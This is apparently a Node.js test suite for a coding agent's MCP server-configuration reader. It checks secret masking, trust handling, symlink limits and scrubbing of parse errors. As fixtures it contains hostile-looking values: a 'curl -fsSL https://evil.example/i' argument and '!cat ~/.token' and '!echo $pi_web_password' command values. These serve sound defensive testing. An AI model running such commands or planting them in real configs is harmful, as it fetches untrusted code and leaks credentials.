import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, realpathSync } from "node:fs";
import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { ProjectTrustStore } from "@earendil-works/pi-coding-agent";
import { createJiti } from "jiti";

const jiti = createJiti(import.meta.url, { moduleCache: false });
const {
  MCP_PROJECT_MAX_SERVERS,
  mcpConfigKey,
  PROJECT_MCP_CONFIG_MAX_BYTES,
  readMcpOverview,
  readMcpServerConfigs,
  readMcpServerEntry,
  templateVariableNames,
} = await jiti.import("./mcp-config-read.ts");
const { scrubMcpLoadError } = await jiti.import("./mcp-json-error.ts");
const { canonicalJson } = await jiti.import("./mcp-host.ts");
const { SECRET_MASK } = await jiti.import("./mcp-secrets.ts");
const { loadPiSdkInternals } = await jiti.import("./pi-sdk-internals.ts");

const internals = await loadPiSdkInternals();
assert.equal(internals.ok, true, internals.reason);

async function fixture(t) {
  // Real paths, so the paths reported compare equal on macOS, whose temp folder is a link.
  const root = realpathSync(await mkdtemp(join(tmpdir(), "pi-web-mcp-config-read-")));
  const agentDir = join(root, "agent");
  const cwd = join(root, "project");
  await mkdir(agentDir, { recursive: true });
  await mkdir(join(cwd, ".pi"), { recursive: true });
  t.after(() => rm(root, { recursive: true, force: true }));
  const writeGlobal = (config) => writeFile(join(agentDir, "mcp.json"), typeof config === "string" ? config : JSON.stringify(config, null, 2));
  const writeProject = (config) => writeFile(join(cwd, ".pi", "mcp.json"), typeof config === "string" ? config : JSON.stringify(config, null, 2));
  const read = (options = {}) => readMcpServerConfigs({
    agentDir,
    project: { cwd, allowedRoots: new Set([cwd]) },
    internals,
    ...options,
  });
  return { root, agentDir, cwd, writeGlobal, writeProject, read };
}

function byName(servers, scope) {
  return Object.fromEntries(servers.filter((server) => !scope || server.scope === scope).map((server) => [server.name, server]));
}

test("both files are listed, each entry described without its secret values", async (t) => {
  const { agentDir, cwd, writeGlobal, writeProject, read } = await fixture(t);
  const docs = {
    url: "https://docs.example.com/mcp?api_key=sk-docs-secret-value&region=eu",
    headers: { Authorization: "Bearer literal-header-secret", Accept: "application/json" },
    exposure: "direct",
  };
  const filesystem = {
    command: "npx",
    args: ["-y", "@modelcontextprotocol/server-filesystem", "--token", "literal-arg-secret", "."],
    env: { GITHUB_TOKEN: "literal-env-secret", DEBUG: "1" },
    cwd: "./data",
    enabled: false,
  };
  await writeGlobal({ autoEnableCodemode: false, mcpServers: { docs, filesystem } });
  await writeProject({ mcpServers: { repo: { command: "node", args: ["server.js"] } } });

  const { files, servers } = read();
  assert.deepEqual(files, [
    { scope: "global", path: join(agentDir, "mcp.json"), exists: true, problems: [], autoEnableCodemode: false },
    { scope: "project", path: join(cwd, ".pi", "mcp.json"), exists: true, problems: [] },
  ]);
  assert.deepEqual(servers.map((server) => [server.scope, server.name]), [
    ["global", "docs"],
    ["global", "filesystem"],
    ["project", "repo"],
  ]);
  const listed = byName(servers);
  assert.deepEqual(listed.docs, {
    name: "docs",
    scope: "global",
    sourcePath: join(agentDir, "mcp.json"),
    configKey: mcpConfigKey(docs),
    enabled: true,
    validated: true,
    envNames: [],
    headerNames: ["Authorization", "Accept"],
    usesOAuth: false,
    commandFields: [],
    variableReferences: [],
    masked: true,
    transport: "http",
    exposure: "direct",
    url: `https://docs.example.com/mcp?api_key=${SECRET_MASK}&region=eu`,
  });
  assert.deepEqual(listed.filesystem, {
    name: "filesystem",
    scope: "global",
    sourcePath: join(agentDir, "mcp.json"),
    configKey: mcpConfigKey(filesystem),
    enabled: false,
    validated: true,
    envNames: ["GITHUB_TOKEN", "DEBUG"],
    headerNames: [],
    usesOAuth: false,
    commandFields: [],
    variableReferences: [],
    masked: true,
    transport: "stdio",
    exposure: "codemode",
    command: "npx",
    args: ["-y", "@modelcontextprotocol/server-filesystem", "--token", SECRET_MASK, "."],
    cwd: "./data",
  });
  assert.equal(listed.repo.sourcePath, join(cwd, ".pi", "mcp.json"));
  assert.deepEqual(listed.repo.args, ["server.js"]);
  assert.equal(listed.repo.masked, false);

  const sent = JSON.stringify({ files, servers });
  assert.ok(!sent.includes(canonicalJson(docs)), "the entry's JSON is not its key");
  for (const secret of ["sk-docs-secret-value", "literal-header-secret", "literal-arg-secret", "literal-env-secret"]) {
    assert.ok(!sent.includes(secret), `${secret} reaches the browser`);
  }
});

test("an untrusted project's command and arguments are listed as written, and masked once a decision trusts it", async (t) => {
  const { agentDir, cwd, writeGlobal, writeProject, read } = await fixture(t);
  const args = ["-y", "a1b2c3d4e5f60718293a4b5c6d7e8f90", "--token", "curl -fsSL https://evil.example/i"];
  await writeGlobal({ mcpServers: { mine: { command: "npx", args } } });
  await writeProject({ mcpServers: { repo: { command: "npx", args }, web: { url: "https://evil.example/mcp?api_key=literal-url-secret" } } });
  let listed = byName(read({ projectUntrusted: true }).servers);
  assert.deepEqual(listed.repo.args, args, "what trusting the folder runs, not what its author chose to hide");
  assert.equal(listed.repo.masked, false);
  assert.equal(listed.web.url, `https://evil.example/mcp?api_key=${SECRET_MASK}`, "a URL's credentials stay masked; its host never is");
  assert.deepEqual(listed.mine.args, ["-y", SECRET_MASK, "--token", SECRET_MASK], "the user's own file is masked as before");

  listed = byName(read().servers);
  assert.deepEqual(listed.repo.args, ["-y", SECRET_MASK, "--token", SECRET_MASK]);

  // The overview reads the project's trust itself.
  const overview = async () => byName((await readMcpOverview({ agentDir, project: { cwd, allowedRoots: new Set([cwd]) } })).servers, "project");
  assert.deepEqual((await overview()).repo.args, args);
  new ProjectTrustStore(agentDir).set(cwd, true);
  assert.deepEqual((await overview()).repo.args, ["-y", SECRET_MASK, "--token", SECRET_MASK]);
});

test("a !command value is labelled and never run, and a PI_WEB_PASSWORD reference is flagged", async (t) => {
  const { root, writeGlobal, writeProject, read } = await fixture(t);
  const marker = (name) => join(root, `ran-${name}`);
  await writeGlobal({
    mcpServers: {
      local: { command: "server", env: { TOKEN: `!touch ${marker("env")}`, PLAIN: "x" } },
      remote: {
        url: "https://remote.example.com/mcp",
        headers: { "X-Key": `!touch ${marker("header")}` },
        oauth: { clientSecret: `!touch ${marker("secret")}` },
      },
      // env is not resolved for an HTTP entry, so it is no command there.
      mixed: { url: "https://mixed.example.com/mcp", env: { TOKEN: `!touch ${marker("unused")}` } },
    },
  });
  await writeProject({
    mcpServers: {
      password: { command: "server", env: { A: "plain", B: "${PI_WEB_PASSWORD}" } },
      piped: { url: "https://piped.example.com/mcp", headers: { Authorization: "!echo $pi_web_password" } },
      escaped: { command: "server", env: { A: "$${PI_WEB_PASSWORD}" } },
    },
  });

  const listed = byName(read().servers);
  assert.deepEqual(listed.local.commandFields, [{ kind: "env", name: "TOKEN" }]);
  assert.deepEqual(listed.remote.commandFields, [{ kind: "header", name: "X-Key" }, { kind: "oauth-client-secret" }]);
  assert.deepEqual(listed.mixed.commandFields, []);
  assert.deepEqual(listed.password.webPasswordField, { kind: "env", name: "B" });
  assert.deepEqual(listed.piped.webPasswordField, { kind: "header", name: "Authorization" });
  assert.deepEqual(listed.piped.commandFields, [{ kind: "header", name: "Authorization" }]);
  assert.equal(listed.escaped.webPasswordField, undefined, "an escaped $ is a literal");
  assert.equal(listed.local.webPasswordField, undefined);
  for (const name of ["env", "header", "secret", "unused"]) assert.equal(existsSync(marker(name)), false, name);
});

test("values that read the host's variables are named, never expanded, and a !command is not one", async (t) => {
  const { writeProject, read } = await fixture(t);
  await writeProject({
    mcpServers: {
      docs: {
        url: "https://docs.example.com/mcp",
        headers: {
          Authorization: "Bearer ${GITHUB_TOKEN}",
          "X-Plain": "literal",
          "X-Run": "!echo $HOME",
          "X-Escaped": "$${NOT_A_VARIABLE}",
        },
        oauth: { clientSecret: "${AWS_SECRET_ACCESS_KEY}$SUFFIX" },
      },
      local: { command: "server", env: { TOKEN: "$HOST_TOKEN", TWICE: "${HOST_TOKEN}-${HOST_TOKEN}" } },
      // env is not resolved for an HTTP entry, so it reads nothing there.
      mixed: { url: "https://mixed.example.com/mcp", env: { UNUSED: "${NEVER_RESOLVED}" } },
    },
  });
  const previous = process.env.GITHUB_TOKEN;
  process.env.GITHUB_TOKEN = "host-secret-value";
  t.after(() => {
    if (previous === undefined) delete process.env.GITHUB_TOKEN;
    else process.env.GITHUB_TOKEN = previous;
  });

  const { servers } = read();
  const listed = byName(servers, "project");
  assert.deepEqual(listed.docs.variableReferences, [
    { kind: "header", name: "Authorization", variables: ["GITHUB_TOKEN"] },
    { kind: "oauth-client-secret", variables: ["AWS_SECRET_ACCESS_KEY", "SUFFIX"] },
  ]);
  assert.deepEqual(listed.docs.commandFields, [{ kind: "header", name: "X-Run" }]);
  assert.deepEqual(listed.local.variableReferences, [
    { kind: "env", name: "TOKEN", variables: ["HOST_TOKEN"] },
    { kind: "env", name: "TWICE", variables: ["HOST_TOKEN"] },
  ]);
  assert.deepEqual(listed.mixed.variableReferences, []);
  assert.ok(!JSON.stringify(servers).includes("host-secret-value"), "nothing is expanded");

  // Without the SDK's parser the local one finds the same names.
  const unchecked = byName(read({ internals: undefined }).servers, "project");
  for (const name of ["docs", "local", "mixed"]) {
    assert.deepEqual(unchecked[name].variableReferences, listed[name].variableReferences, name);
  }
});

test("the local variable parser agrees with the SDK's on every escape and malformed reference", () => {
  // A leading ! makes a command, which neither parser is asked about.
  const values = [
    "", "plain", "$", "$$", "$A", "${A}", "$$A", "$!A", "$$$A", "$${A}", "${A", "${A $B}", "${}", "${A}}",
    "$1A", "a$B_c-d", "${A}${B}$A", "x${bad-name}y$C", "pre $_UNDER post", "${ A }", "$A$", "a!b$!c",
  ];
  for (const value of values) {
    assert.deepEqual(templateVariableNames(value), internals.getConfigValueEnvVarNames(value), JSON.stringify(value));
  }
});

test("an untrusted or broken file is reported while the other still lists", async (t) => {
  const { writeGlobal, writeProject, read } = await fixture(t);
  await writeGlobal({ mcpServers: { kept: { command: "server" } } });
  await writeProject("{ not json");
  let { files, servers } = read();
  assert.equal(files[1].problems.length, 1);
  assert.equal(files[1].problems[0].reason, "unparsable");
  assert.deepEqual(servers.map((server) => server.name), ["kept"]);

  // The parser quotes the text near the error, which may be a secret; that part is left out.
  await writeProject("sk-literal-secret-in-a-broken-file");
  ({ files } = read());
  assert.deepEqual(files[1].problems, [
    { reason: "unparsable", error: "Unexpected token in JSON at position 0 (line 1 column 1)" },
  ], "a letter of the value is not named either");

  await writeProject({ mcpServers: [] });
  ({ files } = read());
  assert.deepEqual(files[1].problems, [{ reason: "invalid-shape", error: 'expected an object with an "mcpServers" object' }]);

  await writeProject({ autoEnableCodemode: "yes", mcpServers: { listed: { command: "server" } } });
  ({ files, servers } = read());
  assert.deepEqual(files[1].problems, [{ reason: "auto-enable-codemode-invalid", error: "autoEnableCodemode must be a boolean" }]);
  assert.deepEqual(servers.map((server) => server.name), ["kept", "listed"], "the servers still load, as in the SDK");

  // A byte-order mark is not stripped, as the SDK does not strip it.
  await writeGlobal(`﻿${JSON.stringify({ mcpServers: { bom: { command: "server" } } })}`);
  ({ files } = read());
  assert.deepEqual(files[0].problems, [
    { reason: "unparsable", error: "Unexpected token U+FEFF in JSON at position 0 (line 1 column 1)" },
  ]);
});

test("a JSON syntax error never quotes the file, wherever in it the error is", async (t) => {
  const { writeGlobal, read } = await fixture(t);
  const cases = [
    // Single quotes pasted from JS or Python: V8 quotes ten characters on either side.
    [
      `{"mcpServers": {"gh": {"command": "npx", "env": {"GITHUB_TOKEN": 'ghp_abcdefghijklmnopqrstuvwxyz0123456789'}}}}`,
      "Unexpected token ''' in JSON at position 65 (line 1 column 66)",
      ["ghp_", "B_TOKEN", "abcde"],
    ],
    [
      `{"mcpServers": {"db": {"command": "npx", "env": {"DB_PASSWORD": 'hunter2'}}}}`,
      "Unexpected token ''' in JSON at position 64 (line 1 column 65)",
      ["hunter2", "ASSWORD"],
    ],
    // Near the end, and on a later line.
    [
      `{"mcpServers": {"x": {"command": "npx"}}, "y": hunter2}`,
      "Unexpected token in JSON at position 47 (line 1 column 48)",
      ["hunter2"],
    ],
    [
      `{\n  "mcpServers": {\n    "x": {\n      "env": { "K": 'abcdef0123456789' }\n    }\n  }\n}`,
      "Unexpected token ''' in JSON at position 51 (line 4 column 21)",
      ["abcdef", '"K"'],
    ],
    // Shorter than 21 characters: V8 quotes it whole and gives no position.
    [`{"a": 'hunter2'}`, "Unexpected token ''' in JSON", ["hunter2"]],
    ["undefined", "Not valid JSON", ["undefined"]],
    // A message with a position quotes nothing and is kept.
    [`{"a": "hunter2",}`, "Expected double-quoted property name in JSON at position 16 (line 1 column 17)", ["hunter2"]],
  ];
  for (const [text, error, absent] of cases) {
    await writeGlobal(text);
    const { files } = read({ project: undefined });
    assert.deepEqual(files[0].problems, [{ reason: "unparsable", error }], text);
    for (const part of absent) assert.ok(!error.includes(part), `${part} quoted from ${text}`);
  }
});

test("invalid entries are listed with the SDK's reason, and only a loadable project entry shadows a global one", async (t) => {
  const { writeGlobal, writeProject, read } = await fixture(t);
  await writeGlobal({
    mcpServers: { shared: { command: "global" }, broken: { command: "global" }, only: { command: "global" } },
  });
  await writeProject({
    mcpServers: { shared: { command: "project" }, broken: { url: 42 }, "bad name": { command: "x" }, legacy: { type: "sse", url: "https://x.example/sse" } },
  });
  const { servers } = read();
  const global = byName(servers, "global");
  const project = byName(servers, "project");
  assert.equal(global.shared.shadowedByProject, true);
  assert.equal(global.broken.shadowedByProject, undefined, "an invalid project entry leaves the global one in place");
  assert.equal(global.only.shadowedByProject, undefined);
  // The project side of the same pairs, for the trust dialog.
  assert.equal(project.shared.replacesGlobal, true);
  assert.equal(project.broken.replacesGlobal, undefined);
  assert.equal(project.legacy.replacesGlobal, undefined);
  assert.equal(global.shared.replacesGlobal, undefined);
  assert.match(project.broken.invalidError, /needs either "command" \(stdio\) or "url"/);
  assert.match(project["bad name"].invalidError, /invalid server name/);
  assert.match(project.legacy.invalidError, /legacy SSE transport is not supported/);
  assert.equal(project.legacy.url, "https://x.example/sse");
  assert.equal(project.legacy.transport, undefined, "a refused entry gets the validator's reading");
  assert.equal(project.legacy.exposure, undefined);
});

test("an entry with a url connects over HTTP, whatever its type says", async (t) => {
  const { root, writeGlobal, read } = await fixture(t);
  const marker = join(root, "ran");
  await writeGlobal({
    mcpServers: {
      // The validator takes both for stdio; the SDK's transport looks for the key `url`.
      typed: {
        type: "stdio",
        command: "server",
        url: "https://typed.example.com/mcp",
        env: { A: `!touch ${marker}` },
        headers: { H: `!touch ${marker}` },
      },
      numeric: { command: "server", url: 42 },
    },
  });
  const listed = byName(read({ project: undefined }).servers);
  assert.equal(listed.typed.invalidError, undefined);
  assert.equal(listed.typed.transport, "http");
  assert.equal(listed.typed.usesOAuth, true);
  assert.equal(listed.typed.signedIn, false);
  assert.deepEqual(listed.typed.commandFields, [{ kind: "header", name: "H" }], "the header runs on connect; the env never does");
  assert.equal(listed.numeric.invalidError, undefined);
  assert.equal(listed.numeric.transport, "http");
  assert.equal(listed.numeric.url, undefined);
  assert.equal(existsSync(marker), false);
});

test("the signed-in state comes from a raw read of mcp-auth.json, which is never created", async (t) => {
  const { agentDir, writeGlobal, read } = await fixture(t);
  await writeGlobal({
    mcpServers: {
      oauth: { url: "https://OAuth.Example.com/mcp" },
      other: { url: "https://other.example.com/mcp" },
      keyed: { url: "https://keyed.example.com/mcp", headers: { authorization: "Bearer ${KEY}" } },
    },
  });
  let listed = byName(read().servers);
  assert.equal(listed.oauth.usesOAuth, true);
  assert.equal(listed.oauth.signedIn, false);
  assert.equal(listed.oauth.oauthStateStored, false);
  assert.equal(listed.keyed.usesOAuth, false);
  assert.equal(listed.keyed.signedIn, undefined);
  assert.equal(listed.keyed.oauthStateStored, undefined);
  assert.equal(existsSync(join(agentDir, "mcp-auth.json")), false);
  assert.equal(existsSync(join(agentDir, "mcp-auth.json.lock")), false);

  // Keyed as the SDK keys it: String(new URL(url)), which lower-cases the host.
  await writeFile(join(agentDir, "mcp-auth.json"), JSON.stringify({
    "https://oauth.example.com/mcp": { serverUrl: "https://oauth.example.com/mcp", tokens: { access_token: "a", token_type: "Bearer" } },
    "https://other.example.com/mcp": { serverUrl: "https://other.example.com/mcp", clientInformation: { client_id: "c" }, codeVerifier: "v" },
  }));
  listed = byName(read().servers);
  assert.equal(listed.oauth.signedIn, true);
  assert.equal(listed.oauth.oauthStateStored, true);
  assert.equal(listed.other.signedIn, false, "a registered client without tokens is not signed in");
  // What a cancelled or expired sign-in leaves, which Sign out still removes.
  assert.equal(listed.other.oauthStateStored, true);

  await writeFile(join(agentDir, "mcp-auth.json"), "{ broken");
  listed = byName(read().servers);
  assert.equal(listed.oauth.signedIn, undefined, "unknown, not signed out");
  assert.equal(listed.oauth.oauthStateStored, undefined);
});

test("a project file is read only where its real path is allowed", async (t) => {
  const { root, cwd, read } = await fixture(t);
  const projectFile = join(cwd, ".pi", "mcp.json");
  const outside = join(root, "outside.json");
  await writeFile(outside, JSON.stringify({ mcpServers: { outside: { command: "x" } } }));

  await symlink(join(root, "missing.json"), projectFile);
  let { files, servers } = read();
  assert.deepEqual(files[1], {
    scope: "project",
    path: projectFile,
    exists: true,
    problems: [{ reason: "link-dangling", error: "a symbolic link to nothing" }],
  });
  await rm(projectFile);

  await symlink(outside, projectFile);
  ({ files, servers } = read());
  assert.equal(files[1].problems[0].reason, "link-outside");
  assert.equal(files[1].realPath, outside);
  assert.deepEqual(servers, []);
  ({ files, servers } = read({ project: { cwd, allowedRoots: new Set([cwd, root]) } }));
  assert.deepEqual(files[1].problems, [], "a link into another allowed folder is followed");
  assert.deepEqual(servers.map((server) => server.name), ["outside"]);
  await rm(projectFile);

  // A link in a folder above the file counts the same.
  await rm(join(cwd, ".pi"), { recursive: true });
  await mkdir(join(root, "elsewhere"));
  await writeFile(join(root, "elsewhere", "mcp.json"), JSON.stringify({ mcpServers: { linked: { command: "x" } } }));
  await symlink(join(root, "elsewhere"), join(cwd, ".pi"));
  ({ files, servers } = read());
  assert.equal(files[1].problems[0].reason, "link-outside");
  assert.deepEqual(servers, []);
  await rm(join(cwd, ".pi"));
  await mkdir(join(cwd, ".pi"));

  await mkdir(projectFile);
  ({ files } = read());
  assert.equal(files[1].problems[0].reason, "not-a-file");
  await rm(projectFile, { recursive: true });

  await writeFile(projectFile, " ".repeat(PROJECT_MCP_CONFIG_MAX_BYTES + 1));
  ({ files } = read());
  assert.equal(files[1].problems[0].reason, "too-large");
  await rm(projectFile);

  ({ files } = read());
  assert.deepEqual(files[1], { scope: "project", path: projectFile, exists: false, problems: [] }, "a missing file is no error");
});

test("a project file declaring more servers than are listed is a problem, and the global file is still listed", async (t) => {
  const { agentDir, cwd, writeGlobal, writeProject, read } = await fixture(t);
  await writeGlobal({ mcpServers: { docs: { url: "https://docs.example/mcp" } } });
  const many = (count) => Object.fromEntries(Array.from({ length: count }, (_, index) => [`s${index}`, { command: "x" }]));
  await writeProject({ mcpServers: many(MCP_PROJECT_MAX_SERVERS) });
  let { files, servers } = read();
  assert.deepEqual(files[1].problems, []);
  assert.equal(servers.length, MCP_PROJECT_MAX_SERVERS + 1, "up to the limit, every entry is listed");

  // 80,000 names in under 1 MiB, written compact.
  await writeFile(join(cwd, ".pi", "mcp.json"), JSON.stringify({ mcpServers: Object.fromEntries(Array.from({ length: 80_000 }, (_, index) => [`s${index}`, 0])) }));
  ({ files, servers } = read());
  assert.deepEqual(files[1].problems, [{ reason: "too-many-servers", error: `declares 80000 servers, more than ${MCP_PROJECT_MAX_SERVERS}` }]);
  assert.deepEqual(servers.map((server) => `${server.scope}:${server.name}`), ["global:docs"]);
  const entry = readMcpServerEntry({ agentDir, scope: "project", name: "s0", project: { cwd, allowedRoots: new Set([cwd]) } });
  assert.deepEqual([entry.ok, entry.reason], [false, "too-many-servers"]);
  // The user's own file has no such limit.
  await writeGlobal({ mcpServers: many(MCP_PROJECT_MAX_SERVERS + 1) });
  ({ files, servers } = read({ project: undefined }));
  assert.deepEqual(files[0].problems, []);
  assert.equal(servers.length, MCP_PROJECT_MAX_SERVERS + 1);
});

test("an entry nested deeper than the stack allows is listed with the rest of its file", async (t) => {
  const { agentDir, cwd, writeGlobal, read } = await fixture(t);
  let deep = "x";
  for (let level = 0; level < 5_000; level++) deep = [deep];
  // Not written with JSON.stringify(…, null, 2), whose indentation would make it megabytes.
  await writeFile(join(cwd, ".pi", "mcp.json"), JSON.stringify({ mcpServers: { evil: { command: "x", pad: deep }, hide: deep, repo: { command: "repo-srv" } } }));
  await writeGlobal({ mcpServers: { docs: { url: "https://docs.example/mcp" } } });
  const { files, servers } = read();
  assert.deepEqual(files.map((file) => file.problems), [[], []]);
  assert.deepEqual(servers.map((server) => `${server.scope}:${server.name}`), ["global:docs", "project:evil", "project:hide", "project:repo"]);
  const { evil, hide } = byName(servers, "project");
  assert.equal(evil.command, "x");
  assert.equal(typeof evil.configKey, "string");
  assert.match(hide.invalidError, /hide/);
  const entry = readMcpServerEntry({ agentDir, scope: "project", name: "evil", project: { cwd, allowedRoots: new Set([cwd]) } });
  assert.equal(entry.configKey, evil.configKey);
});

test("what loadMcpConfig reports is logged without the source text a parse error quotes", () => {
  const path = "/home/u/.pi/agent/mcp.json";
  const project = "/repo/.pi/mcp.json";
  let parseError;
  try {
    JSON.parse(`{"mcpServers":{"gh":{"env":{"GITHUB_TOKEN":'ghp_SECRETabcdefghijklmnop1234'}}}}`);
  } catch (error) {
    parseError = error.message;
  }
  assert.match(parseError, /ghp_SECRE/, "V8 quotes the token");
  assert.equal(scrubMcpLoadError(`${path}: ${parseError}`, [path, project]), `${path}: Unexpected token ''' in JSON`);
  assert.equal(scrubMcpLoadError(`${project}: Unexpected token 's', "sk-abcdefg" is not valid JSON`, [path, project]), `${project}: Unexpected token in JSON`);
  // Messages that quote nothing of the file are kept as they are.
  for (const message of [
    `${path}: server "broken": url must be an http or https URL`,
    `${path}: Expected ',' or '}' after property value in JSON at position 30 (line 1 column 31)`,
    `${project}: EACCES: permission denied, open '${project}'`,
  ]) {
    assert.equal(scrubMcpLoadError(message, [path, project]), message);
  }
  assert.equal(scrubMcpLoadError(`${path}: "undefined" is not valid JSON`, [path]), `${path}: Not valid JSON`);
});

test("a FIFO in place of the project file is never opened for reading", { skip: process.platform === "win32" }, async (t) => {
  const { cwd, read } = await fixture(t);
  execFileSync("mkfifo", [join(cwd, ".pi", "mcp.json")]);
  const { files } = read();
  assert.equal(files[1].problems[0].reason, "not-a-file");
});

test("the global file follows a link wherever it leads; a dangling one reads as no file", async (t) => {
  const { root, agentDir, read } = await fixture(t);
  const dotfiles = join(root, "dotfiles-mcp.json");
  await writeFile(dotfiles, JSON.stringify({ mcpServers: { linked: { command: "x" } } }));
  await symlink(dotfiles, join(agentDir, "mcp.json"));
  let { files, servers } = read({ project: undefined });
  assert.deepEqual(files, [{ scope: "global", path: join(agentDir, "mcp.json"), realPath: dotfiles, exists: true, problems: [] }]);
  assert.deepEqual(servers.map((server) => server.name), ["linked"]);
  await rm(dotfiles);
  ({ files, servers } = read({ project: undefined }));
  assert.deepEqual(files, [{ scope: "global", path: join(agentDir, "mcp.json"), exists: false, problems: [] }]);
});

test("without the SDK's validator, raw entries are still listed and a leading ! still marks a command", async (t) => {
  const { writeGlobal, read } = await fixture(t);
  await writeGlobal({
    mcpServers: {
      local: { command: "server", env: { TOKEN: "!cat ~/.token", REF: "${PI_WEB_PASSWORD}" } },
      junk: "not an object",
    },
  });
  const listed = byName(read({ internals: undefined, project: undefined }).servers);
  assert.equal(listed.local.validated, false);
  assert.equal(listed.local.invalidError, undefined);
  assert.equal(listed.local.exposure, undefined);
  assert.equal(listed.local.transport, "stdio");
  assert.deepEqual(listed.local.commandFields, [{ kind: "env", name: "TOKEN" }]);
  assert.deepEqual(listed.local.webPasswordField, { kind: "env", name: "REF" });
  assert.equal(listed.junk.validated, false);
  assert.equal(listed.junk.configKey, mcpConfigKey("not an object"));
  // Not an object: no switch can change it, with or without the validator.
  assert.equal(listed.junk.notAnObject, true);
  assert.equal(listed.junk.enabled, true);
  assert.equal(listed.local.notAnObject, undefined);
});

test("on a trusted merge the per-file reader agrees with the SDK's loadMcpConfig", async (t) => {
  const { agentDir, cwd, writeGlobal, writeProject, read } = await fixture(t);
  await writeGlobal({
    mcpServers: {
      a: { command: "global-a" },
      shared: { url: "https://global.example.com/mcp" },
      invalidInProject: { command: "global" },
      invalidGlobal: { command: 7 },
      disabled: { command: "off", enabled: false },
    },
  });
  await writeProject({
    autoEnableCodemode: true,
    mcpServers: {
      shared: { command: "project-shared" },
      invalidInProject: { url: "ftp://nope" },
      b: { url: "https://b.example.com/mcp", exposure: "deferred" },
    },
  });
  const { servers } = read();
  const ours = servers
    .filter((server) => !server.invalidError && !server.shadowedByProject)
    .map((server) => [server.name, { source: server.sourcePath, scope: server.scope, key: server.configKey, enabled: server.enabled }])
    .sort(([a], [b]) => a.localeCompare(b));
  const loaded = internals.loadMcpConfig({ agentDir, cwd, projectTrusted: true });
  const theirs = loaded.servers
    .map((entry) => [entry.name, { source: entry.source, scope: entry.scope, key: mcpConfigKey(entry.config), enabled: entry.config.enabled !== false }])
    .sort(([a], [b]) => a.localeCompare(b));
  assert.deepEqual(ours, theirs);
  const globalNames = new Set(servers.filter((server) => server.scope === "global").map((server) => server.name));
  assert.deepEqual(
    servers.filter((server) => server.replacesGlobal).map((server) => server.name),
    loaded.servers.filter((entry) => entry.scope === "project" && globalNames.has(entry.name)).map((entry) => entry.name),
    "replacesGlobal marks exactly the project entries the SDK loads in place of a global one",
  );
  assert.equal(
    servers.filter((server) => server.invalidError).length,
    loaded.errors.length,
    "every entry the SDK skips is listed as invalid",
  );
});

test("an entry's key follows its content, not its key order, and reveals none of it", () => {
  const key = mcpConfigKey({ command: "x", env: { TOKEN: "hunter2" } });
  assert.equal(mcpConfigKey({ env: { TOKEN: "hunter2" }, command: "x" }), key);
  assert.notEqual(mcpConfigKey({ command: "x", env: { TOKEN: "hunter3" } }), key);
  assert.ok(!key.includes("hunter2"));
  assert.match(key, /^[A-Za-z0-9_-]{43}$/);
});

test("one entry is read for a route the way the listing reads it, link rule included", async (t) => {
  const { root, agentDir, cwd, writeGlobal, writeProject } = await fixture(t);
  const entry = { command: "node", args: ["server.js"], env: { TOKEN: "literal-env-secret" } };
  await writeGlobal({ mcpServers: { lint: entry, odd: "not an object" } });
  await writeProject({ mcpServers: { repo: { url: "https://repo.example/mcp" } } });
  const project = { cwd, allowedRoots: new Set([cwd]) };
  const globalPath = join(agentDir, "mcp.json");

  // The raw entry, literal values included (it never reaches the browser), and the key GET reports.
  const lint = readMcpServerEntry({ agentDir, scope: "global", name: "lint" });
  assert.deepEqual(lint, { ok: true, value: entry, sourcePath: globalPath, configKey: mcpConfigKey(entry) });
  assert.equal(lint.configKey, readMcpServerConfigs({ agentDir, internals }).servers.find((server) => server.name === "lint").configKey);
  // An entry that is not an object is still the file's entry; the route decides what to do with it.
  assert.equal(readMcpServerEntry({ agentDir, scope: "global", name: "odd" }).value, "not an object");
  assert.deepEqual(readMcpServerEntry({ agentDir, scope: "project", name: "repo", project }), {
    ok: true,
    value: { url: "https://repo.example/mcp" },
    sourcePath: join(cwd, ".pi", "mcp.json"),
    configKey: mcpConfigKey({ url: "https://repo.example/mcp" }),
  });
  assert.throws(() => readMcpServerEntry({ agentDir, scope: "project", name: "repo" }), /needs the project/);

  // A name the file does not define, a property of every object included.
  for (const name of ["missing", "__proto__", "constructor", "toString"]) {
    assert.deepEqual(readMcpServerEntry({ agentDir, scope: "global", name }), {
      ok: false,
      reason: "server-missing",
      error: `${globalPath} does not define MCP server "${name}"`,
      path: globalPath,
    });
  }
  await rm(globalPath);
  assert.equal(readMcpServerEntry({ agentDir, scope: "global", name: "lint" }).reason, "server-missing");

  // A file problem refuses every entry of the file, without quoting it.
  await writeGlobal('{ "mcpServers": { "lint": { "command": \'literal-env-secret\' } } }');
  const unparsable = readMcpServerEntry({ agentDir, scope: "global", name: "lint" });
  assert.equal(unparsable.ok, false);
  assert.equal(unparsable.reason, "unparsable");
  assert.ok(!unparsable.error.includes("literal-env-secret"));
  await writeGlobal({ mcpServers: [] });
  assert.equal(readMcpServerEntry({ agentDir, scope: "global", name: "lint" }).reason, "invalid-shape");
  // autoEnableCodemode set wrong leaves the servers loading, so their entries are read.
  await writeGlobal({ autoEnableCodemode: "yes", mcpServers: { lint: entry } });
  assert.equal(readMcpServerEntry({ agentDir, scope: "global", name: "lint" }).ok, true);

  // A project file that links outside the allowed folders is refused, as the listing refuses it.
  const outside = join(root, "outside.json");
  await writeFile(outside, JSON.stringify({ mcpServers: { repo: { command: "evil" } } }));
  await rm(join(cwd, ".pi", "mcp.json"));
  await symlink(outside, join(cwd, ".pi", "mcp.json"));
  assert.deepEqual(readMcpServerEntry({ agentDir, scope: "project", name: "repo", project }), {
    ok: false,
    reason: "link-outside",
    error: "a symbolic link outside the folders Pi Web may read",
    path: join(cwd, ".pi", "mcp.json"),
  });
});
